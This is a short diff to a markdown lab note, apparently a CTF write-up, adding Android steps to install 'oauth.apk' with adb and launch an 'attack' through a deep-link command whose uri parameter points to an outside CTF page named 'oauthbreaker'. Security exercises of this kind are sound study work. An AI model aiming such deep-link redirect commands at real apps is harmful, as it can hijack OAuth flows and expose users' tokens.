@@ -78,7 +78,15 @@ or for Objective C
 
 ./DVIA-v2/AppDelegate.m
 
+### Android Studio
 
+Use bar Tools -> SDK Manager then copy Android SDK Location, open terminal and direct to that path then add:&#x20;
+
+`adb install oauth.apk`
+
+then in command line I can start attack:
+
+`adb shell am start -d "oauth://final/?uri=https://sarlota-duskova.github.io/CTF/oauthbreaker/"`
 
 
 
